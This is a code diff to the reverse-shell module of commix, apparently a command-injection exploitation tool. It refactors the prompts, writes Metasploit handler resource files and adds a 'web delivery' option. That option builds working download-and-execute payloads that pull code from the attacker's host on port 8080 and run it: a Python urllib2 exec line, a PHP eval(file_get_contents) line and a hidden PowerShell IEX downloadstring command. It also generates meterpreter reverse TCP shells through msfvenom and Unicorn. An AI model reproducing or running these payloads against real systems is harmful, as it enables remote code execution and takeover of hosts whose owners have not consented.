@@ -24,6 +24,75 @@ from src.utils import settings
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 """
+Error msg if the attack vector is available only for Windows targets.
+"""
+def windows_only_attack_vector():
+    error_msg = "This attack vector is available only for Windows targets."
+    print settings.print_error_msg(error_msg)
+
+"""
+Message regarding the MSF handler.
+"""
+def msf_launch_msg(output):
+    info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
+    print settings.print_info_msg(info_msg)
+    info_msg = "Once the loading is done, press here any key to continue..."
+    sys.stdout.write(settings.print_info_msg(info_msg))
+    sys.stdin.readline().replace("\n","")
+    # Remove the ouput file.
+    os.remove(output)
+
+"""
+Set up the PHP working directory on the target host.
+"""
+def set_php_working_dir():
+  while True:
+    question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
+    question_msg += "' as PHP working directory on the target host? [Y/n] > "
+    sys.stdout.write(settings.print_question_msg(question_msg))
+    php_dir = sys.stdin.readline().replace("\n","").lower()
+    if php_dir in settings.CHOICE_YES:
+      break
+    elif php_dir in settings.CHOICE_NO:
+      question_msg = "Please provide a custom working directory for PHP (e.g. '" 
+      question_msg += settings.WIN_PHP_DIR + "') > "
+      sys.stdout.write(settings.print_question_msg(question_msg))
+      settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
+      settings.USER_DEFINED_PHP_DIR = True
+      break
+    else:
+      if php_dir == "":
+        php_dir = "enter"
+      err_msg = "'" + php_dir + "' is not a valid answer."  
+      print settings.print_error_msg(err_msg)
+      pass
+
+"""
+Set up the Python working directory on the target host.
+"""
+def set_python_working_dir():
+  while True:
+    question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
+    question_msg += "' as Python working directory on the target host? [Y/n] > "
+    sys.stdout.write(settings.print_question_msg(question_msg))
+    python_dir = sys.stdin.readline().replace("\n","").lower()
+    if python_dir in settings.CHOICE_YES:
+      break
+    elif python_dir in settings.CHOICE_NO:
+      question_msg = "Please provide a custom working directory for Python (e.g. '" 
+      question_msg += settings.WIN_PYTHON_DIR + "') > "
+      sys.stdout.write(settings.print_question_msg(question_msg))
+      settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
+      settings.USER_DEFINED_PYTHON_DIR = True
+      break
+    else:
+      if python_dir == "":
+        python_dir = "enter"
+      err_msg = "'" + python_dir + "' is not a valid answer."  
+      print settings.print_error_msg(err_msg)
+      pass
+
+"""
 check / set lhost option for reverse TCP connection
 """
 def check_lhost(lhost):
@@ -126,6 +195,7 @@ def other_reverse_shells():
   Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
   Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
   Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
+  Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use the web delivery script. 
 
 commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     # PHP-reverse-shell
@@ -173,10 +243,10 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
         continue
 
       payload = "php/meterpreter/reverse_tcp"
-      output = "php_meterpreter.txt"
+      output = "php_meterpreter.rc"
 
       info_msg = "Generating the '" + payload + "' payload... "
-      sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+      sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
         proc = subprocess.Popen("msfvenom -p " + str(payload) + 
@@ -188,34 +258,22 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        if settings.TARGET_OS == "win": 
-          print ""
-          while True:
-            question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
-            question_msg += "' as PHP working directory on the target host? [Y/n] > "
-            sys.stdout.write(settings.print_question_msg(question_msg))
-            php_dir = sys.stdin.readline().replace("\n","").lower()
-            if php_dir in settings.CHOICE_YES:
-              break
-            elif php_dir in settings.CHOICE_NO:
-              question_msg = "Please provide a custom working directory for PHP (e.g. '" 
-              question_msg += settings.WIN_PHP_DIR + "') > "
-              sys.stdout.write(settings.print_question_msg(question_msg))
-              settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
-              break
-            else:
-              if php_dir == "":
-                php_dir = "enter"
-              err_msg = "'" + php_dir + "' is not a valid answer."  
-              print settings.print_error_msg(err_msg)
-              pass
-
-          other_shell = settings.WIN_PHP_DIR + " -r " + data
-        else:
-          other_shell = "php -r \"" + data + "\""
         print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
         # Remove the ouput file.
         os.remove(output)
+        with open(output, 'w+') as filewrite:
+          filewrite.write("use exploit/multi/handler\n"
+                          "set payload " + payload + "\n"
+                          "set lhost "+ str(settings.LHOST) + "\n"
+                          "set lport "+ str(settings.LPORT) + "\n"
+                          "exploit\n\n")
+
+        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+          set_php_working_dir()
+          other_shell = settings.WIN_PHP_DIR + " -r " + data
+        else:
+          other_shell = "php -r \"" + data + "\""
+        msf_launch_msg(output)
       except:
         print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
       break
@@ -229,10 +287,10 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
         continue
 
       payload = "python/meterpreter/reverse_tcp"
-      output = "py_meterpreter.txt"
+      output = "py_meterpreter.rc"
 
       info_msg = "Generating the '" + payload + "' payload... "
-      sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+      sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
         proc = subprocess.Popen("msfvenom -p " + str(payload) + 
@@ -245,41 +303,29 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
           data = ''.join(data)
           data = base64.b64encode(data)
 
-        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
-          print ""
-          while True:
-            question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
-            question_msg += "' as Python working directory on the target host? [Y/n] > "
-            sys.stdout.write(settings.print_question_msg(question_msg))
-            python_dir = sys.stdin.readline().replace("\n","").lower()
-            if python_dir in settings.CHOICE_YES:
-              break
-            elif python_dir in settings.CHOICE_NO:
-              question_msg = "Please provide a custom working directory for Python (e.g. '" 
-              question_msg += settings.WIN_PYTHON_DIR + "') > "
-              sys.stdout.write(settings.print_question_msg(question_msg))
-              settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
-              break
-            else:
-              if python_dir == "":
-                python_dir = "enter"
-              err_msg = "'" + python_dir + "' is not a valid answer."  
-              print settings.print_error_msg(err_msg)
-              pass
-          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
-        else:
-          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
         print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
         # Remove the ouput file.
         os.remove(output)
+        with open(output, 'w+') as filewrite:
+          filewrite.write("use exploit/multi/handler\n"
+                          "set payload " + payload + "\n"
+                          "set lhost "+ str(settings.LHOST) + "\n"
+                          "set lport "+ str(settings.LPORT) + "\n"
+                          "exploit\n\n")
+
+        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
+          set_python_working_dir()
+          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+        else:
+          other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+        msf_launch_msg(output)
       except:
         print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
       break
 
     elif other_shell == '7':
       if not settings.TARGET_OS == "win":
-        error_msg = "This attack vector is available only for Windows targets."
-        print settings.print_error_msg(error_msg)
+        windows_only_attack_vector()
         continue
       else:
         while True:
@@ -296,11 +342,11 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
             continue
             
           payload = "windows/meterpreter/reverse_tcp"
-          output = "powershell_attack.txt"
+          output = "powershell_attack.rc"
 
           # define standard metasploit payload
           info_msg = "Generating the '" + payload + "' shellcode... "
-          sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+          sys.stdout.write(settings.print_info_msg(info_msg))
           sys.stdout.flush()
 
           # TrustedSec's Magic Unicorn (3rd Party)
@@ -317,26 +363,103 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
               # Remove the ouput file.
               os.remove(output)
+              with open(output, 'w+') as filewrite:
+                filewrite.write("use exploit/multi/handler\n"
+                                "set payload " + payload + "\n"
+                                "set lhost "+ str(settings.LHOST) + "\n"
+                                "set lport "+ str(settings.LPORT) + "\n"
+                                "exploit\n\n")
+              msf_launch_msg(output)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
 
           if windows_reverse_shell == '2':
+            output = "powershell_attack.txt"
             unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
             os.chdir(unicorn_path)
             try:
               subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
-              # Remove the "unicorn.rc" file.
-              os.remove("unicorn.rc")
               with open(output, 'r') as content_file:
                 other_shell = content_file.read().replace('\n', '')
               print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+
+              with open("unicorn.rc", 'w+') as filewrite:
+                filewrite.write("use exploit/multi/handler\n"
+                                "set payload " + payload + "\n"
+                                "set lhost "+ str(settings.LHOST) + "\n"
+                                "set lport "+ str(settings.LPORT) + "\n"
+                                "exploit\n\n")
+              msf_launch_msg("unicorn.rc")
               # Remove the ouput file.
               os.remove(output)
             except:
               print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
             break
       break
+
+    elif other_shell == '8':
+      while True:
+        web_delivery = raw_input("""
+  ---[ """ + Style.BRIGHT + Fore.BLUE + """Web delivery script""" + Style.RESET_ALL + """ ]---
+  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use Python meterpreter reverse TCP shell.
+  Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use PHP meterpreter reverse TCP shell.
+  Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meterpreter reverse TCP shell.
+
+commix(""" + Style.BRIGHT + Fore.RED + """web_delivery""" + Style.RESET_ALL + """) > """)
+
+        if not os.path.exists(settings.METASPLOIT_PATH):
+          error_msg = settings.METASPLOIT_ERROR_MSG
+          print settings.print_error_msg(error_msg)
+          continue
+          
+        output = "web_delivery.rc"
+        target = str(int(web_delivery)-1)
+        if web_delivery == '1':
+          payload = "python/meterpreter/reverse_tcp"
+        elif web_delivery == '2':
+          payload = "php/meterpreter/reverse_tcp"
+        elif web_delivery == '3':
+          payload = "windows/meterpreter/reverse_tcp"
+
+        with open(output, 'w+') as filewrite:
+          filewrite.write("use exploit/multi/script/web_delivery\n"
+                          "set target " + target + "\n"
+                          "set payload " + payload + "\n"
+                          "set lhost "+ str(settings.LHOST) + "\n"
+                          "set uripath / \n"
+                          "exploit\n\n")
+
+        if web_delivery == '1':
+          data = "import urllib2; r=urllib2.urlopen('http://" + str(settings.LHOST) + ":8080/'); exec(r.read());"
+          data = base64.b64encode(data)
+          if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
+            set_python_working_dir()
+            other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+          else:
+            other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
+          msf_launch_msg(output)
+          break
+
+        elif web_delivery == '2':
+          if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+            set_php_working_dir()
+            other_shell = settings.WIN_PHP_DIR + " -d allow_url_fopen=true -r eval(file_get_contents('http://" + str(settings.LHOST) + ":8080/'));"
+          else:
+            other_shell = "php -d allow_url_fopen=true -r \"eval(file_get_contents('http://" + str(settings.LHOST) + ":8080/'));\""
+          msf_launch_msg(output)
+          break
+
+        elif web_delivery == '3':
+          if not settings.TARGET_OS == "win":
+            windows_only_attack_vector()
+            continue
+          else:
+            other_shell = "powershell -nop -w hidden -c $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy(); $x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $x.downloadstring('http://" + str(settings.LHOST) + ":8080/');"
+            msf_launch_msg(output)
+            break
+      break
+
     elif other_shell.lower() == "reverse_tcp":
       warn_msg = "You are already into the 'reverse_tcp' mode."
       print settings.print_warning_msg(warn_msg)
